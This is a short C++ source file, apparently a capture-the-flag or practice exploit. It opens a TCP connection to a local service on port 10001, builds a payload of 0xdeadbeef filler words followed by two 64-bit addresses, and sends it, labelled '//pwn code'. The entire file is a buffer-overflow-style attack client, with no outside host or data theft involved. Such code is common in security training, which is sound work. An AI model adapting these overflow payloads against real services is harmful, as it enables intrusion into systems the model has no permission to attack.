#include "tcp_class.h"
#include "payload.h"
#include <iostream>

int main(void){
  Client_sock sock;
  payload payl;
  sock.MakeSocket();
  sock.SetOpt("127.0.0.1",10001);
  sock.Connect();
  //pwn code
  for(uint32_t i=0;i<4;i++){
    payl.p64(0xdeadbeef,true);
  }
  payl.p64(0x1030,true);
  payl.p64(0x3fc8,true);
  payl.print_all();
  sock.Send(payl); 
  return 0;
}
